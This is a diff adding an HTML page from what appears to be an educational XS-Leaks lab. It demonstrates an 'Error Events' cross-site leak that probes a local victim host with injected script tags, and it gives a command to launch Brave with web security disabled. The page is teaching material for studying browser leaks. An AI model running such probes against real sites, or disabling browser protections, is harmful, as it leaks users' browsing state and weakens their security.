@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSLL - Attacker - Error Events</title>
+    <script>
+        function probeError(url) {
+            let script = document.createElement('script');
+            script.src = url;
+
+            script.onload = () => {
+                console.log('Onload event triggered');
+                alert(`Onload event triggered for URL:\n${url}`);
+            }
+
+            script.onerror = () => {
+                console.log('Error event triggered');
+                alert(`Error event triggered for URL:\n${url}`);
+            }
+
+            document.body.appendChild(script);
+        }
+    </script>
+</head>
+
+<body>
+    <h1>Error Events</h1>
+    <ul>
+        <li><a href="../index.html">Home</a></li>
+    </ul>
+
+    <h2>Introduction</h2>
+    <p>This page will help demonstrate an Error Events attack.</p>
+    <p>This XS Leak requires Cross-origin resource sharing (CORS) to be deactivated. To archieve this (at least on
+        MacOS) you can use the folling commands in your terminal:</p>
+    <ul>
+        <li>open -n -a /Applications/Brave\ Browser.app/Contents/MacOS/Brave\ Browser --args
+            --user-data-dir="/tmp/brave_dev_sess_1" --disable-web-security</li>
+    </ul>
+    <h2>Attack</h2>
+    <p>Start the attack by clicking one of the buttons below.</p>
+    <p>The attack will leak whether a webpage is present in the <a href="http://victim.local:27182/">leaker</a>.</p>
+    <h3>Existing Webpage</h3>
+    <p>This will check whether <a href="http://victim.local:27182/xs-leaks/error-events.html">this</a> webpage is
+        available (it is).</p>
+    <p>When available it will load an onload event.</p>
+    <p>
+        <button onclick="probeError('http\:\/\/victim.local:27182/xs-leaks/error-events.html')">URL - 1</button>
+    </p>
+    <h3>Non-Existing Webpage</h3>
+    <p>This will check whether <a href="victim.local:27182/xs-leaks/404">this</a> webpage is available (it is not).</p>
+    <p>When not available it will load an error event.</p>
+    <p>
+        <button onclick="probeError('http\:\/\/victim.local:27182/xs-leaks/404')">URL - 2</button>
+    </p>
+    
+    <div id=message></div>
+</body>
+
+</html>
